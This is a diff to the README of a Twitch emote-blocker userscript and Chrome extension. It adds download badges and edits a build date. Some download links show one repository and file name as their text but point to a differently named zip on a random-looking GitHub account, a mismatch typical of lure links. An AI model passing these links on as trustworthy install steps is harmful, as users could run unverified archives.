@@ -29,7 +29,12 @@ KeywordFiltering.
 2. Click [Install this script](https://greasyfork.org/en/scripts/520235-control-emotes-panel-2-6-52-c-tapeavion) on this page.
  
 ## Download
-- Download the Chrome extension: [2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild]([https://github.com/gullampisFx8A/Twitch_emote-blocker_mainpage7BTVFZTV/releases/download/2.6.55-ui-fix-update/2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild.zip](https://github.com/ftpobpl47hGTN56/Twitch_emote-blocker_chromeEXT_present_mainpage_7BTVFZTV/releases/download/2.155.26/panelcontrol26.zip))
+
+[![Download Extension](https://img.shields.io/badge/Download-v2.6.55-0d1117?style=for-the-badge&logo=github&logoColor=white&labelColor=238636&color=238636)](https://github.com/ftpobpl47hGTN56/Twitch_emote-blocker_chromeEXT_present_mainpage_7BTVFZTV/releases/download/2.155.26/panelcontrol26.zip)
+&nbsp;
+[![Greasyfork](https://img.shields.io/badge/Greasyfork-Install%20Script-0d1117?style=for-the-badge&logo=tampermonkey&logoColor=white&labelColor=670000&color=670000)](https://greasyfork.org/en/scripts/520235-control-emotes-panel-2-6-52-c-tapeavion)
+
+- Download the Chrome extension: [2.6.55-7btvfzttv_Chrome_extension_12_05_2026_FinalBuild]([https://github.com/gullampisFx8A/Twitch_emote-blocker_mainpage7BTVFZTV/releases/download/2.6.55-ui-fix-update/2.6.55-7btvfzttv_Chrome_extension_20_05_2025_FinalBuild.zip](https://github.com/ftpobpl47hGTN56/Twitch_emote-blocker_chromeEXT_present_mainpage_7BTVFZTV/releases/download/2.155.26/panelcontrol26.zip))
 
 ## Notes
 - **Firefox Compatibility**: The script may have issues on Firefox. For the best experience, use Chrome with Tampermonkey.
